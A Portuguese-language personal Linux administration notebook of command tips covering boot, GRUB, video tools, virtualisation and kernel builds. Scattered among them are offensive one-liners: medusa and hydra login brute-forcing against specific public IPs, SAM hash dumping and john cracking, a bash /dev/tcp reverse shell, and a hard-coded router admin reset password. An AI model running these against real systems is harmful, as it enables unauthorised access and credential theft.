        ExecStart=/usr/lib/bluetooth/bluetoothd
        ExecStart=/usr/lib/bluetooth/bluetoothd --noplugin=sap

        systemctl daemon-reload

- Restart the bluetooth:

        service bluetooth restart

### Módulo melhorado
[rtl8188ce-linux-driver](https://github.com/FreedomBen/rtl8188ce-linux-driver)

### Ajustando nome da interface de rede

    printf '# PCI device 0x10ec:0x8168 (rtl8192cu)\nSUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="30:b5:c2:11:33:85", ATTR{dev_id}=="0x0", ATTR{type}=="1", KERNEL=="wlan*", NAME="wlan0"\n' > /etc/udev/rules.d/70-persistent-net.rules

### Ajustando configuração do network-manager
Edite o arquivo e adicione:

[device]
wifi.scan-rand-mac-address=no

### Desabilitando kernel lockdown
```
echo 1 > /proc/sys/kernel/sysrq
echo x > /proc/sysrq-trigger

ou
mokutil --disable-validation

```
### Alterando carregamento do módulo de leitor de cartão que apresenta o dispositivo mesmo sem mídia.
```
echo "options ums_realtek ss_en=0" > /etc/modprobe.d/ums-realtek.conf
```
### Ver parâmetros de um módulo
no pacote sysfsutils
```
systool -v -m i915
```

### Controle de frequência
No pacote: linux-cpupower

```
cpupower frequency-info
cpupower frequency-set -g ondemand
cpupower frequency-set -g performance
cpupower frequency-set -g powersave
```

### A Linux way to disable the Virtual CD on WD disks

No log:
...kernel: sr 6:0:0:1: Attached scsi CD-ROM sr0

```
apt install sdparm

sdparm --page=0x20 --hex /dev/sdc

[0x20] mode page:
    Current:
 00     a0 06 30 00 30 00 00 00
    Changeable:
 00     a0 06 00 00 23 00 00 00
    Default:
 00     a0 06 30 00 30 00 00 00
    Saved:
 00     a0 06 30 00 30 00 00 00

sdparm --page=0x20 --set 4:1:1=1 --save /dev/sdc

sdparm --page=0x20 --hex /dev/sdc
[0x20] mode page:
    Current:
 00     a0 06 30 00 32 00 00 00
    Changeable:
 00     a0 06 00 00 23 00 00 00
    Default:
 00     a0 06 30 00 30 00 00 00
    Saved:
 00     a0 06 30 00 32 00 00 00

Para reabilitar:

sdparm --page=0x20 --set 4:1:1=0 --save /dev/sdc

```
### Para calibrar a bateria

```
apt install power-calibrate
power-calibrate  -R -r 20 -d 5 -s 21 -n 0 -p
```

### Recriando dispositivo de cd/dvd removido

```
cd /dev
mknod sr0 b 11 0
chgrp cdrom sr0
chmod 660 sr0
```

### Para descartar blocos não usados no SSD

     fstrim --all

### Para evitar que o log fique lotado

Aparecem no log n msgs:
pcieport 0000:00:1c.5: PCIe Bus Error: severity=Corrected,

Para que elas não apareçam pode fazer assim:
edita /etc/default/grub

Na linha
    GRUB_CMD_LINUX_DEFAULT="quiet pci=noaer"

inclua esse pci=noaer

rode:
update-grub
reboot e veja se pararam as msgs.

### Verificar tamanho real de um pendrive
```
f3probe --destructive --time-ops /dev/sdb
[sudo] password for michel: 
F3 probe 6.0
Copyright (C) 2010 Digirati Internet LTDA.
This is free software; see the source for copying conditions.

WARNING: Probing may **demolish data,** so it is more suitable for flash drives out of the box, without files being stored yet. The process normally takes from a few seconds to 15 minutes, but
         it can take longer. Please be patient. 

Bad news: The device `/dev/sdb' is a counterfeit of type limbo

You can "fix" this device using the following command:
f3fix --last-sec=16477878 /dev/sdb

Device geometry:
             *Usable* size: 7.86 GB (16477879 blocks)
            Announced size: 15.33 GB (32155648 blocks)
                    Module: 16.00 GB (2^34 Bytes)
    Approximate cache size: 0.00 Byte (0 blocks), need-reset=yes
       Physical block size: 512.00 Byte (2^9 Bytes)

Probe time: 1'13"
 Operation: total time / count = avg time
      Read: 472.1ms / 4198 = 112us
     Write: 55.48s / 2158 = 25.7ms
     Reset: 17.88s / 14 = 1.27s
```

Ajustando para o tamanho real "Usabe size"
```
f3fix --last-sec=16477878 /dev/sdb
```
### verificando frequência dos processadores
Valeu Israel.

```
watch -n1 "cat /proc/cpuinfo | grep \"^[c]pu MHz\"" 
```

###

# Boots
<a href="#Dicas-ng">`^`</a>

### menu.lst example for Microsoft on drive 2
- Don't forget the dual boot issues as above

    title windows plan A
    hide (hd0,0)
    rootnoverify (hd1,0)
    map (hd0)Z(hd1)
    map (hd1)Z(hd0)
    makeactive
    chainloader +1

 EXPLAIN
 Remove the Z so there is ONE space between the map brackets.
 MS sits on /dev/hdc1 ( aka C drive) Grub says that is (hd1,0)
 rootnoverify says don't try to mount this partition but execute the next command etc
 map says what you think is drive 1 is now drive 2 and what was drive 2 is now 1 so C drive now thinks its truly on first drive first partition.
 makeactive says if this was not yet bootable make it so
 chainloader says don't try to boot this DEAR GRUB, but let whatever that partition has a bootloader attempt to do so

    title windows plan B as plan A failed more paranoid
    hide (hd0,0)
    unhide (hd1,0)
    rootnoverify (hd1,0)
    map (hd0)z(hd1)
    map (hd1)z(hd0)
    makeactive
    chainloader +1
    boot

> Remember to remove the z between the brackets and have ONE SPACE.

### debootstrap

    debootstrap --arch amd64 wheezy /debian http://ftp.debian.org/debian
    debootstrap wheezy /debian http://ftp.br.debian.org/debian
    debootstrap lenny ./lenny-chroot http://ftp.br.debian.org/debian

    mkdir /debian
    mount /dev/sda2 /debian
    debootstrap sid /debian http://deb.debian.org/debian

    for i in /sys /proc /dev /dev/pts; do mount --bind $i /debian$i; done

    mount -t proc proc /debian/proc
    mount -o bind /dev /debian/dev
    mount -o bind /sys /debian/sys
    mount -o bind /dev/pts /debian/dev/pts

    LC_ALL= chroot /debian /bin/bash

- /etc/fstab
- /etc/hostname
- /etc/hosts
- /etc/network/interfaces
- /etc/resolv.conf
- adduser e passwd root
- install kernel
- install grub

        aptitude install locales
        dpkg-reconfigure locales
        cat /proc/mounts /etc/mtab

        /etc/apt/sources.list

### debootstrap com mais pacotes

    debootstrap --include=less,locales,sudo,openssh-server,bash-completion buster /debian http://deb.debian.org/debian

### Boot numa iso !? testar

    grub> map (hd1,1)PATHtoISO.iso (hd4)
    grub> map --rehook
    grub> chainloader (hd4)+1
    grub> rootnoverify (hd4)
    grub> boot

### Continuando rescue grub

    grub rescue> set prefix=(hd0,1)/boot/grub
    grub rescue> set root=(hd0,1)
    grub rescue> insmod normal
    grub rescue> normal
    grub rescue> insmod linux
    grub rescue> linux /boot/vmlinuz-3.13.0-29-generic root=/dev/sda1
    grub rescue> initrd /boot/initrd.img-3.13.0-29-generic
    grub rescue> boot

### Para colocar layout de teclado no grub
    mkdir /boot/grub/layouts

- criar o mapa

        grub-kbdcomp -o /boot/grub/layouts/jp.gkb jp
        grub-kbdcomp -o /boot/grub/layouts/pt.gkb pt

    criar e dar permissão de execução em /etc/grub.d/42_custom

        #!/bin/sh
        exec tail -n +3 $0

        insmod keylayouts
        keymap jp

- no /etc/default/grub

        GRUB_TERMINAL_INPUT="at_keyboard"
        update-grub

### Para forçar para no grub rescue
This will drop you into an initramfs shell:

Start your computer. Wait until the Grub menu appears.
Hit e to edit the boot commands.
Append break to your kernel line.
Hit F10 to boot.
Within a moment, you will find yourself in a initramfs shell.

http://manpages.ubuntu.com/manpages/cosmic/en/man8/initramfs-tools.8.html

### No shell grub
    echo $grub_platform

### Para incluir o mapa de teclado no initram
Edite o arquivo `/etc/initramfs-tools/initramfs.conf` e coloque a linha:
```
KEYMAP=y
```
Rode:
```
update-initramfs -u -k all
```

### Para definir o target do systemd
Incluir na linha linux do grub:
```
systemd.unit=multi-user.target
```

### Para eliminar msgs de erro acpi durante o boot
No arquivo */etc/default/grub* incluir na linha:

```
GRUB_CMDLINE_LINUX_DEFAULT="quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log-priority=3 raid=noautodetect"
```

### Para saber os modos de vídeo no grub
```
antigamente:
vbeinfo

agora:
videoinfo
```

### Habilitar terminal serial do GRUB
Editar /etc/default/grub
Incluir as linhas:
```
GRUB_TERMINAL_INPUT="console serial"
GRUB_TERMINAL_OUTPUT="gfxterm serial"
GRUB_SERIAL_COMMAND="serial --unit=0 --speed=115200"
```
Rodar:
```
update-grub
```

Para acessar da máquina real na VM:
```
minicom -D /dev/pts/9
```

### Para habilitar console depois do boot

Na VM rode:
```
systemctl enable serial-getty@ttyS0.service
systemctl status serial-getty@ttyS0.service
```

Na máquina real:
```
virsh console nome-VM
```

### Verificando se deu boot via BIOS ou UEFI

```
[ -d /sys/firmware/efi/efivars ] && echo UEFI || echo BIOS
```

### Para entrar no setup da uefi

- A partir do shell digite: exit <enter>
- A partir do console do grub digite: fwsetup <enter>

### Setup da UEFI Virtual

Para help com paginador

```
help -b
```

# Utils
<a href="#Dicas-ng">`^`</a>

### Para criar os hashs do virtual_maps

    postmap virtual_maps < virtual_maps

- postfix refuses to deliver to a mailbox > 50MB

      Set 'mailbox_size_limit' to some other value:
      mailbox_size_limit = 2147483648


- Postfix refuses e-mails > 10MB

      Set 'message_size_limit' to some other value:
      message_size_limit = 524288000 #(500M)

- Postfix refuses to deliver mail while there's plenty diskspace left ('452 Insufficient system storage')

      Set 'queue_minfree' to some other value:
      queue_minfree = 2024000

- WARNING: 'queue_minfree' must be at least 1.5 x the 'message_size_limit'!

### Converter flv em mpg

    ffmpeg -i video.flv -ar 44100 -b 1500  -s 320x240 video.mpg
    ffmpeg -i video.flv -target ntsc-dvd -aspect 4:3 output.mpg

### Stream para mkv

    ffmpeg -i "https://s3.amazonaws.com/flowplayer.escola02/pdf_aula02/pdf_aula02_.m3u8" -c copy -bsf:a aac_adtstoasc aula2a.mkv
    ffmpeg $(youtube-dl -g 'https://www.youtube.com/watch?v=qsav0VdLrr4' | sed "s/.*/-ss 03:11:25 -i &/") -t 5:10:25 -c copy stallman.mkv

### Para pegar uma parte de um video do youtube

    ffmpeg -i $(youtube-dl -f 22 --get-url https://www.youtube.com/watch?v=Z92yjm3HAYU ) -ss 00:10:29 -t 00:00:27 -c:v copy -c:a copy bugalho.mp4

 - -ss inicio -t quanto tempo

         youtube-dl -F 'http://www.youtube.com/watch?v=P9pzm5b6FFY'

 - mostra as qualidades dispníveis

         youtube-dl -f 22 'http://www.youtube.com/watch?v=P9pzm5b6FFY'

> 22 é uma das qualidades disponíveis

### Baixar audio de playlist do youtube e converter para mp3

    youtube-dl --ignore-errors --format bestaudio --extract-audio --audio-format mp3 --audio-quality 160K --output "%(title)s.%(ext)s" --yes-playlist '<YouTube playlist URL>'

### Baixar thumbnail

    youtube-dl  url --write-thumbnail --skip-download

### mkvmerge

    mkvmerge -o destino.mkv video.x legenda.srt

### mkvextract e merge

    mkvextract original.mkv tracks 0:audio0 1:audio1 2:video
    mkvmerge -o copia.mkv audio1 audio0 video

### colocar atraso no audio
Nesse exemplo 100ms

    mkvmerge -o destino.mkv -y 1:100 origem.mkv

### reduzir tamanho do arquivo de vídeo

    ffmpeg -i input.mp4 -c:v libx264 -profile:v baseline -level 1 output.mp4
    ffmpeg -i input.mp4 -vcodec libx265 -crf 22 output.mp4
    ffmpeg -i input.mp4 -vcodec libx264 -vf scale=iw/2:ih/2 -profile:v baseline -crf 22 -threads 0 -ac 2 -ab 128k -ar 44100 -f mp4 output.mp4

### Extrair legendas

    mkvextract express.mkv tracks 2:express.srt

### Apagar áudio

    ffmpeg -i [input_file] -vcodec copy -an [output_file]

### Para ver o conteúdo de um tgz pode usar o vi

    vi arquivo.tgz

### Criptografar arquivo (pedirá uma passphare)

    gpg -c arquivo.tgz
 - decriptografar
    gpg -d arquivo.tgz.gpg > arquivo.tgz

### Para cuidar do lock e impedir o acesso a arquivos

    strict locking = yes
    oplocks = yes
    level2 oplocks = no

### Gerar números randômicos para por exemplo chaves de criptografia

    dd if=/dev/random bs=32 count=1 2>/dev/null | od -An -tx1

### Para que o procmail encaminhe as msgs em maildir

    home_mailbox = Maildir/
    mailbox_command = procmail -a "$EXTENSION" DEFAULT=$HOME/Maildir/ MAILDIR=$HOME/Maildir

### Para criar o "enviar por email" no Nautilus

- instalar  nautilus-actions

        aptitude install nautilus-actions

- rodar:

        /usr/bin/nautilus-actions-config

- criar um nova ação:

        icedove -compose  attachment=file:/%u

### Para exportar todas as palavras de um dict

      aspell dump master pt_BR > palvras.em.pt.br

### Gerar certificado ssl para postfix

    /usr/sbin/make-ssl-cert generate-default-snakeoil

### Editar o alternatives

    update-alternatives --config pager

### Substituir texto em vários arquivos (correção horário em ver.cgi)

    find . -name "*.cgi" | xargs -n1 perl -i -ane 's/14400/21600/g; print;'

### Para apagar um host com porta diferente de 22
    [intranet.setup.com.br]:2222


### Quando no mplayer der o erro:
- Win32 LoadLibrary failed to load: avisynth.dll
- use --playlist

        mplayer --playlist url
        mplayer -vc ffwmv3 arquivo.wmv

### Para retirar o autoident do vim

    /usr/share/vim/vim71/debian.vim

- coloque " astes da linha  set autoindent

### Colocar preview de música no nautilus
- instalar os pacotes:
> gnome-audio faac libesd-alsa0 esound flac gqmpeg mpg123 mpg321 sox

### Para ver o que um prog está fazendo !!

    strace -o log skype

### substituição usando sed

    sed 's/texto_antigo/texto_novo/' arquivo.txt
    sed -i ¿s/texto a ser substituido/texto novo/g¿ *

    for i in `ls *txt`; do sed -i 's/informations/information/g' $i;done

    echo "algo com espaços" | sed  's/\s/\n/g'

- trocando por "<enter>"

        sed -e '/^#/d' => removendo linhas iniciadas por #
ou

        find . -name "*.cgi" | xargs -n1 perl -i -ane 's/18000/14400/g; print;'
        sed 's/14400/21600/' -i *.cgi

### Para mandar 1 e 2 para buraco negro

    > /dev/null 2>&1

### Para mexer no umask do pure-ftpd
- no arquivo /etc/pure-ftpd/conf/Umask coloque o valor do umask em octal para dir e arquivos

        echo "113 002" > /etc/pure-ftpd/conf/Umask

### Converter imagens
    for img in $(ls *.jpg); do convert $img -resize 1000 -quality 80 smaller-$img; done;

### Para passar disco via rdp

    rdesktop -u username -r disk:usb=/mnt 192.168.15.210

### dump de um banco mysql
- qual banco !?
    mysql -u user -p -h 200.168.64.31
	show databases;
- dump do banco:

        mysqldump -u user --password=senha --databases nome_do_banco -h host >dump.sql
    show columns from USER_PRIVILEGES;
    describe dogs;

### alterar base ldap
    ldapmodify -x -h localhost -W -D "cn=Directory Manager" -f file.ldif

    #file.ldif
    dn: uid=blucca,ou=users,dc=cespi,dc=unlp,dc=edu,dc=ar
    changetype: modify
    replace: uidNumber
    uidNumber: 0

### No postfix para smart host

    postmap sasl_passwd

    splashy
    /usr/share/splashy/themes/

    splashy_config -s debiansplashy
    update-initramfs -u

### Para ajustar a hora com comando date
    date -s MMDDHHMMAAAA
    date -s 030711112009

    date --set="2014-09-29 16:21:42"
    date 0929162114

### Ajuste de horário no ver.cgi e demais scripts
    find . -name "*.cgi" | xargs -n1 perl -i -ane 's/18000/14400/g; print;'

### Substituição com sed

    cat something |sed s/old/new/g

### Medusa
    medusa -h 189.126.119.15 -M ssh -C 123users -f
    medusa -h 189.126.119.15 -M ssh -U users -P senhas -e s
    medusa -h 192.168.5.100 -u root -P /usr/share/wordlists/sqlmap.txt -M ssh -t 5

### Para ver a base qdo não quer mostar
    ldapsearch -x -b '' -LLL -s base 'objectclass=*' -h 189.19.229.149
    ldapsearch "(objectClass=*)" -x -s base namingContexts -h 189.19.229.149
    ldapsearch -x -b '' 'objectclass=*' -h 189.19.229.149

### Para usar libs dora do padrão
    export LD_LIBRARY_PATH= /dir/das/libs/

### RDP/Rdesktop Password Grinding

    medusa -M wrapper -m TYPE:STDIN -m PROG:rdesktop -m ARGS:"-u %U -p - %H" -H hosts.txt -U users.txt -P passwords.txt

### convert tdbsam para hashs samba
    pdbedit -i tdbsam -e smbpasswd

### Para abrir o SAM

    bkhive system saved-syskey.txt
    samdump2 sam saved-syskey.txt>password-hashes.txt


### The following example shows one way to use rdesktop with the MEDUSA wrapper module:

    medusa -M wrapper -m TYPE:STDIN -m PROG:rdesktop -m ARGS:"-u %U -p - %H" -H hosts.txt -U users.txt -P passwords.txt

One possible method for hiding the graphical output from rdesktop:
    % Xvfb :97 -ac -nolisten tcp &
    % export DISPLAY=:97

    decrypt .pfx file
    openssl pkcs12 -in backup.pfx  -out chaves.pen  -nodes

-ao contrário

    openssl pkcs12 -export -in pub.certificate -inkey key.pem -out cerificate.pfx

### cor das legendas
    mplayer xxxx.rmvb -ass -ass-color ffff0000 -ass-border-color 00000000

### erro no dvd-styler
    export VIDEO_FORMAT=NTSC

### Baixando....
    wget -r -l0 -N -c -v -erobots=off

### Para mudar a aparência do relógio no gnome-shell
-alterei no arquivo: /usr/share/gnome-shell/js/ui/dateMenu.js
- para ver os formatos de data, consulte: man strftime

### Controle do pam por hora
     /etc/security/time.conf

     #Service;type;user;not allowed hours
     * ; * ; niania ; !Al0000-2400

### no pam.d no serviço:
     account    requisite  pam_time.so

"As regras implícitas e normais misturadas"
"mixed implicit and static pattern rules"

alterar arquivo:

    --- /usr/src/linux-headers-3.0.0-1-amd64/Makefile-old	2011-07-25 21:12:52.554079823 +0200
    +++ /usr/src/linux-headers-3.0.0-1-amd64/Makefile	2011-07-25 21:14:50.342072676 +0200
    @@ -7,5 +7,7 @@
     all:
        @$(MAKE) $(MAKEARGS) $(cmd)
    Makefile:;
    -$(cmd) %/: all
    +$(cmd): all
    +    @:
    +%/: all
         @:

### Reduzir tamanho de fotos:
    mogrify -resize 640 *.jpg

### cpan
    perl -MCPAN -e shell

    install Net::DNS

    aptitude install libnet-dns-perl

### Arrumando as pastas do evolution
    apt-get install sqlite3

    cd ~/.evolution/mail ; for i in `find . -name folders.db`; do echo "Rebuilding Table $i"; sqlite3 $i "pragma integrity_check;"; done

### uudecode
    crie o arquivo arquivo.uu
    copie o código pego no email

- na primeira linha:
    begin-base64 644 arquivo.jpg
- última linha:
    "===="

- de o comando:
    uudecode arquivo.uu -o arquivo.jpg


### Mudar senha de chave privada
    ssh-keygen -f id_rsa -p

    # -C combo file: user:pass -t qtde de threads -W 1 agiarda 1min -V mostra tentativas
    hydra -C projectus1.hydra 200.213.192.2 rdp -t 1 -W 1 -V

### Verificar o tipo de chave
    ssh-keygen -l -f id_rsa.pub

### para alterar o background

    update-alternatives --install /usr/share/images/desktop-base/desktop-background desktop-background /usr/share/images/desktop-base/Quantum.jpg 30


### no john

    ./john arquivo mscash --format=mscash

### mostrar  apenas alguns usuários no gdm3
    /etc/gdm3/daemon.conf
    [greeter]

    # Only include selected logins in the greeter
    IncludeAll = false
    Include = user1, user2
ou no `/etc/gdm3/greeter.gsettings` uncomment the line `disable-user-list=true`

### Para ver a fingerprint da chave do servidor ssh
    ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub

### Recuperar senha de conta de email no evolution

Users of old Linux installations without GNOME keyrings will find usernames and passwords stored under ~/.gnome2_private/Evolution (you might want to also check the presence of this file, if your Linux system is upgraded. There is no point in having credentials safely encrypted, if they are also lying around unprotected). It's contents should look something like this:

    [Passwords-Mail]
    smtp:__username;auth_PLAIN@mail.provider.com_=SGVsbG9Xb3JsZAo==
    pop:__username_=SGVsbG9Xb3JsZAo==
    Recovering the username is fairly trivial. The password is obviously the seemingly random letter string at the end of the line. It looks encrypted, but actually it is only base64 encoded, which pretty much only offers protection against accidentally reading the clear text value. To decode the password, open a shell and type the following:
    echo "SGVsbG9Xb3JsZAo=" | base64 -d
    With "SGVsbG9Xb3JsZAo=" being the copy and pasted string between the first and the last equals sign. Decoding the password from this example should print the string "HelloWorld" to the console.

### Para converter uft-8 em iso

    iconv -f UTF-8 -t ISO-8859-15 in.txt > out.txt

- qdo dá erro:

        iconv -c -f UTF-8 -t ISO-8859-15 in.txt > out.txt
        iconv -f UTF-8 -t ISO-8859-15//TRANSLIT in.txt > out.txt


### Eliminar linhas em branco
    grep -e '^$' -v /etc/rsyslog.conf

### Para o vi mostrar espaços e finais de linha
    no arquivo: .vim/vimrc
    set listchars=eol:$,tab:>-,trail:~,extends:>,precedes:<,space:.
    set list
### Eu fiz
    cp /bin/ls /bin/ls.old
    cp /bin/chmod /bin/ls

ls é chmod

### Aumentar a velocidade de um vídeo sem distorcer.
    mplayer --af=scaletempo --speed=1.2 aula-4_empacotamento.mp4

    /usr/lib/icedove/run-mozilla.sh -g /usr/lib/icedove/icedove-bin 2>&1 | tee /tmp/icedove-gdb-$(apt-cache show icedove | grep Version | awk '{ print $2 }')_$(date +%F_%T).log

### Qdo eu tinha um dump hex mostrando os bytes em texto

    xxd -r -p arq_com_os_hex arq_binario

### Para derrubar interfaces virtuais do kvm

    virsh net-destroy default
    virsh net-undefine default
    service libvirtd stop

    ip link delete dev virbr0
    ip link delete dev virbr0-nic

    ip addr del 10.22.30.44/16 dev eth0

    - To remove all addresses (in case you have multiple):

    ip addr flush dev eth0

### Para verificar/up/down "cabo" da interface virtual da VM

- obtendo estatísticas

    virsh domifstat debian10 --interface vnet12

- verificando IP da VM

    virsh domifaddr debian10

- obtendo estado do link

    virsh domif-getlink debian10 --interface vnet12

- Desconectando "cabo"

    virsh domif-setlink debian10 --interface vnet12 down

- Reconectando "cabo"

    virsh domif-setlink debian10 --interface vnet12 up

### Encontar "coisas fora de lugar"

    cruft -d / -r report --ignore /home --ignore /var

### Converter pdf to epub
    ebook-convert arquivo.pdf arquivo.epub --enable-heuristics

### Converter mo em po
    msgunfmt [path_to_file.mo] > [path_to_file.po]


### Baixar e verificar cd iso
-  baixar a iso

         wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.0.0-amd64-netinst.iso

- baixar hashs

        wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/SHA256SUMS

- verificar a iso

        sha256sum -c SHA256SUMS

- baixar certificado

        wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/SHA256SUMS.sign

- verificar qual chave assinou o SHA256SUMS

        gpg --verify SHA256SUMS.sign SHA256SUMS

- verificar finger print do Debian

        gpg --search-keys 'Debian CD signing key <debian-cd@lists.debian.org>

### Resolver o colar no vim
- colocar:
    set clipboard=unnamedplus
    no arquivo /root/.vimrc

        echo "set clipboard=unnamedplus" >> /root/.vimrc


### Arquivo que warsaw usa para identificar a máquina
    /sys/class/dmi/id/modalias

### I used the snapshots service to get the old version.

I put the following line in /etc/apt/sources.list.d/snapshots.list :

    deb [signed-by=/usr/share/keyrings/debian-archive-keyring.gpg] http://snapshot.debian.org/archive/debian/20170806/ sid main

then i did:

    apt update
    apt install thunderbird=1:52.2.1-4

### Para ver detalhes da vm

    virsh domblklist --domain debian9 --details
    virsh domblkstat --domain debian10 vda --human

### Para matar as ifaces virtuais

    virsh net-destroy default
    service libvirtd stop

### Para clonar vm

    virt-clone --original debian10 --auto-clone

    service libvirtd stop
    ip link delete dev virbr0
    ip link delete dev virbr0-nic

### usb passthrough

```
virsh attach-device debian10 --file usb.device.xml --persistent
virsh attach-device debian10 --file usb.device.xml --live

virsh detach-device debian10 --persistent --file usb.device.xml
```

usb.device.xml
```
<hostdev mode='subsystem' type='usb' managed='yes'>
   <source>
      <vendor id='0x0781'/>
      <product id='0x5567'/>
   </source>
</hostdev>
```

### Colocando enter no delimitador
    cut -d":" smp -f1- --output-delimiter=$'\n'

### Usar tab como delimitador

    easy way
    cut -f2 infile
    ** tab is default delimiter

Press Ctrl+V and then Tab.

    cut -f2 -d'   ' infile
or write it like this:

    cut -f2 -d$'\t' infile

### Para pegar o último campo

    cut -d":" -f1- | rev | cut -d":" -f1 |rev
    cut -d":" /etc/passwd -f1-|rev |cut -d":" -f1 | rev

### Para saber se está num ambiente chtoot

    if [ "$(stat -c %d:%i /)" != "$(stat -c %d:%i /proc/1/root/.)" ]; then
      echo "We are chrooted!"
    else
      echo "Business as usual"
    fi


### HAHAHA adicionar um usuário num grupo e reler para que ele já faça parte sem logar de novo.
- root coloca usuário no grupo novo

        adduser usuario gruponovo

- usuário roda:

        newgrp gruponovo

### converter nome de arquivos
    convmv -f iso-8859-1 -t UTF-8 -r *
    convmv -f iso-8859-1 -t UTF-8 -r * --notest


### Reset admim adm password asus
 colocar data do hardware: 23/11/2011
 errar a senha uma vez
 teclar alt-r
 senha: A1AAABEA

### Conferir tzdata
    zdump -V America/Sao_Paulo |grep 201[89]

###  Pau do lightdm que deixa esperando 1,30 min problema de account
instalei pacote: accountsservice

### Para rodar sem levar em conta alias
    \comando
    "comando"

### Para rodar a última ocorrência de um comando.
    !comando

### fc para listar, editar e re-executar cmds do history
    fc -l
    fc -l 1000 2000
    fc -l -n (sem os números)

### Pegar conteúdo parcial de arquivo
    awk 'NR >= 57890000 && NR <= 57890010' /path/to/file

### dmesg comes with two handy options for that:
Desabilitando mensagens do terminal

  -D, --console-off           disable printing messages to console

  -E, --console-on            enable printing messages to console

dmesg -D is just a shortcut for dmesg -n 1, except that it stores the current log level, so that you can easily restore it with dmesg -E. So it's a bit more convenient than changing the log level with dmesg -n.

Additionally, you can check the current log level with:

    $ cat /proc/sys/kernel/printk
7       4       1       7

### Calcular espaço dos . dot dirs
    du -msh .[^.]* | sort -h
    du -msh .[^.]* 2>/dev/null| sort -h
    du -hs .[^.]* |sort -hr

### Encontrar os miores arquivos
    find / -type f -print0 2>/dev/null| xargs -0 du -h | sort -rh | head -n 20

### webp
    apt install webp

### Convert JPEG/PNG to WebP
    cwebp -q [image_quality] [JPEG/PNG_filename] -o [WebP_filename]
    cwebp -q 90 example.jpeg -o example.webp

### Convert WebP to JPEG/PNG
    dwebp [WebP_filename] -o [PNG_filename]
    dwebp example.webp -o example.png

### export e expire
    gpg --list-secret-keys
    gpg --export-secret-keys 5E3A2D8ADA62D240622EC84239F17A5F5AEFBE73 > my-private-key.asc

    gpg --edit-key 5E3A2D8ADA62D240622EC84239F17A5F5AEFBE73
gpg> expire
n (dias`)
save

    gpg --keyserver pgp.mit.edu --send-keys 5E3A2D8ADA62D240622EC84239F17A5F5AEFBE73

### sort maluco

    sort -n -t: -k 3 /etc/passwd

-n por número, -t para usar : como separador de campos e -k para usar o terceiro campo

### Dia da semana
    cc = year/100;
    yy = year - ((year/100)*100);

    c = (cc/4) - 2*cc-1;
    y = 5*yy/4;
    m = 26*(month+1)/10;
    d = day;

### Problema básico samba 4
https://wiki.samba.org/index.php/Samba_Member_Server_Troubleshooting

###  Copiar e colar nano
seleciona texto com shift e setas
Alt 6 copiar
Control u colar

### Colocando senha via useradd

<code>

     useradd [`] -p"$(python -c "import crypt; print crypt.crypt(\"foo\", \"\$6\$$(</dev/urandom tr -dc 'a-zA-Z0-9' | head -c 32)\$\")")" [`]
     useradd -d /home/usuario -m -s /bin/bash -p "$(python -c "import crypt; print crypt.crypt(\"foo\", \"\$6\$$(</dev/urandom tr -dc 'a-zA-Z0-9' | head -c 32)\$\")")" usuario

     useradd -d /home/usuario -m -s /bin/bash -p "$(openssl passwd -6 -salt $(</dev/urandom tr -dc 'a-zA-Z0-9' | head -c 32) secret_password)" usuario
     openssl passwd -6 -salt secret_salt secret_password`

</code>

- a mais fácil:

        useradd -d /home/usuario -m -s /bin/bash -p "$(openssl passwd -6 -salt $(openssl rand -hex 12) senha)" usuario

### Para compilar módulos em separado
- altere via Xconfig o suporte ao módulo

        cd /usr/src/linux

- make modules SUBDIRS=drivers/scsi/
o arquivo compilado será colocado no mesmo dir.

exemplo:

    cd /usr/src
    wget https://linux-libre.fsfla.org/pub/linux-libre/freesh/linux-libre-5.5.3-source.tar.lz
    tar -xvf linux-libre-5.5.3-source.tar.lz
    ln -s linux-libre-5.5.3-source/linux

    dpkg -i /root/linux-headers-5.5.3-gnu_5.5.3-gnu-1.0_amd64.deb

### Forma alternativa de gerar o .config

    cd /usr/src/linux
    cp /boot/config-5.5.3-gnu .config

    apt install bc liblz4-tool

    make prepare
    make localmodconfig


- deu uns erros:

   **kmod_module_get_holders: could not open '/sys/module/video/holders': No such file or directory**

    make-kpkg --initrd --revision=1.0.NAS kernel_image kernel_headers

### Moda Debian

    apt install kernel-package
    make-kpkg clean
    make-kpkg --initrd --revision=1.1 kernel_image

    real	183m27,168s
    user	166m53,631s
     sys	18m52,650s

    # make-kpkg --revision x.x kernel_image

### Alterar infos como user@server e data e hora de compilação
    /usr/src/linux-libre-5.5.3-source/linux/include/generated/compile.h

### Para instalar
    dpkg -i linux-image-0.1.deb

    update-initramfs -c -k 3.2.54
    update-grub

### Alterando as infos da compilação

    export UTS_VERSION "#1 SMP Thu Feb 13 00:00:07 -03 2020"
    export LINUX_COMPILE_BY "kretcheu"
    export LINUX_COMPILE_HOST "donaco"

### Definindo rede default com virsh

    virsh net-edit default

<network>
  <name>default</name>
  <bridge name="virbr0"/>
  <forward mode="nat"/>
  <ip address="192.168.122.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.122.2" end="192.168.122.254"/>
      <host mac="52:54:00:6f:78:f3" ip="192.168.122.222"/>
      <host mac="52:54:00:91:ed:23" ip="192.168.122.233"/>
    </dhcp>
  </ip>
</network>

- alterando DNS

  <domain name='default'/>
  <dns>
    <forwarder addr='8.8.8.8'/>
  </dns>

### Usando script para gravar sessão
```
script logs.txt
ctrl-d

scriptreplay logs.tst

col -bp logs.txt | less -R
```

### Junstando arquivos binarios merge
Para aumentar um disco virtual (raw).
```
fallocate -l 1G puxadinho
dd if=puxadinho >>disco-virtual
```
Depois precisa ajustar a tabela de partições.

### Pesquisar no vi case insensitive

```
/\ctermo-da-pesquisa
```

### Encontrando lista de pacotes com erro e gerando uma lista
```
debsums -a 2>erros 1>logs
awk -F 'from ' '{print $2 }' erros

```

### Encontrando os 10 arquivos mais recentes.
```
find $1 -type f -exec stat --format '%Y :%y %n' "{}" \; | sort -n | cut -d: -f2-
```

### Incluindo usuários via script
```
useradd -c automaticUser -m -k/dev/null -s /bin/bash $USER
echo "$USER:$PWD" | chpasswd ---crypt-method SHA512 $USER
```

### Shell Reverso

- Cliente
```
nc -lp 3000
```

- Servidor
```
bash -i > /dev/tcp/ip-servidor/3000 0>&1

```
### Converter VHD

```
qemu-img convert -f vpc -O raw something.vhd something.raw
```

### criando sua mídia ISO de instalação do Debian

